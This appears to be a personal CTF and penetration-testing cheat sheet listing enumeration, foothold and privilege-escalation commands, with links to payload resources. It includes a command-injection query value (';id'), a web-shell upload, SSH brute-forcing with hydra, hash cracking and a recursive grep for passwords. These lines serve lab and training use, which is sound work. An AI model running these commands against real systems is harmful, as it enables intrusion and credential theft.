# 💀 CyberJess CTF Cheat Sheet

```diff
> enumerate everything • exploit carefully • detect everything
```
---

## 🧠 Enumeration

- [ ] Nmap scans
- [ ] Service fingerprinting
  - [ ] Banner-grab
  - [ ] Searchsploit / Google
- [ ] Web recon
  - [ ] Stack / technologies
  - [ ] Subdomains
  - [ ] Endpoints
  - [ ] Parameters
  - [ ] Injection points
  - [ ] CMS/framework versions
- [ ] Network services
  - [ ] SNMP / NFS / SMB / FTP / DNS / SMTP / LDAP

---

## 🚪 Foothold

- [ ] Anonymous FTP / SMB
- [ ] Default creds
- [ ] Known exploits
- [ ] Credential attacks
- [ ] Web attacks (SQLi, upload, RCE, etc.)

---

## ⬆️ PrivEsc

- [ ] whoami / id / sudo -l
- [ ] Users / groups / env
- [ ] Sensitive files / creds
- [ ] SUID / capabilities
- [ ] LinPEAS / WinPEAS
- [ ] Services / cron
- [ ] Kernel exploits

---

## 🔍 Reconnaissance

### Nmap
```bash
nmap -p- [Target IP] -v -A -T5
```
```bash
nmap -A <target> -oN scan.initial
```
```bash
nmap -p- -A <target> -T4 -oN scan.full  
```
```bash
nmap -p- -sU --top-ports 200 <target> -oN scan.udp  
```
### Rustscan
```bash
rustscan -a [Target IP] -- -A
```
---

## 🌐 Enumeration Commands

### Banner grabbing
```bash
nc -nv <target> 80
```
```bash 
curl -sv http://<target>/ -o /dev/null
```
```bash
openssl s_client -connect <target>:443 -servername <target> | head
``` 

### Searchsploit
```bash
searchsploit "Apache Tomcat 7.0.88"
```
```bash
searchsploit --nmap scan.initial  
```
---

## 🌐 Web Recon

### Technologies
```bash
whatweb -a 3 http://<target>
```
```bash
httpx -tech-detect -title -status -ip -o tech.txt
```

### Subdomains
```bash
ffuf -u http://<target> -H "Host: FUZZ.<target>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 4242
```

### Vhosts

```bash
./vhost-fuzzer.sh [domain] wordlist http://domain
```

### Endpoints
```bash
ffuf -u http://<target>/FUZZ -w wordlist -mc 200,204,301,302,307,401,403
```
```bash
dirsearch -u http://<target> -e php,txt,bak
```

### Parameters
```bash
arjun -u http://<target>/search.php
```
```bash
paramspider -d <domain>
```

### Injection
```bash
wfuzz -u http://<target>/page.php?id=FUZZ -w sql.txt --hc 404
```

### CMS
```bash
wpscan --url http://<target>
```
```bash
droopescan scan drupal -u http://<target>
```
```bash
joomscan --url http://<target>
```
---

## 🚪 Foothold Commands

### SMB
```bash
smbclient -L //<target> -N
```
```bash
smbclient //targetIP/anonymous -N
```
```bash
enum4linux -a <target>
```

### FTP
```bash
ftp -p anonymous@IP
```
```bash 
ftp <IP> <PORT>
```

### Hydra
```bash
hydra -L users.txt -P rockyou.txt ssh://<target>
```

### Hash cracking
```bash
john --wordlist=rockyou.txt hash.txt
```
```bash
hashcat -m # hashfile wordlist -a mode
``` 

---

## 🌐 Web Attacks
```bash
curl -G "http://<target>/ping?ip=127.0.0.1;id"
```
```bash
curl -F "file=@shell.php" http://<target>/upload.php
```
```bash  
sqlmap -u "http://<target>?id=1" --batch  
```
---

## ⬆️ Privilege Escalation

### Quick recon
```bash 
whoami
```
```bash
id
```
```bash
sudo -l
```
```bash
systeminfo
```
```bash
uname -a  
```

### Files
```bash
find / -perm -4000 -type f 2>/dev/null
```
```bash
grep -Ri "password" /home /opt 2>/dev/null  
```

### Capabilities
```bash
getcap -r / 2>/dev/null
``` 

### Tools
```bash
./linpeas.sh
``` 
```bash
./pspy64  
``` 
---

## 🛠️ Services

### SSH
```bash
ssh user@IP -p PORT
```

### RDP
```bash
xfreerdp /v:IP /u:USER /p:PASSWORD  
```

### Telnet
```bash
telnet IP PORT  
```
---

## 📚 Resources

```diff
> external knowledge sources loaded...
```

- 💀 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- 🧠 [HackTricks](https://book.hacktricks.xyz)
- 💣 [Exploit-DB](https://www.exploit-db.com)
- 🔓 [GTFOBins](https://gtfobins.github.io)
- ⚙️ [LOLBAS](https://lolbas-project.github.io)
- 🧰 [PEASS-ng](https://github.com/peass-ng/PEASS-ng)
- 📂 [SecLists](https://github.com/danielmiessler/SecLists)
- 🔁 [revshells.com](https://www.revshells.com)
- 🐚 [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## 💀 CyberJess Protocol

```diff
+ [INIT] protocol loaded

+ [MODE] offensive
+   scan aggressively
+   enumerate deeply
+   exploit precisely
+   escalate silently

+ [MODE] detection
+   analyze logs
+   correlate events
+   detect everything
```
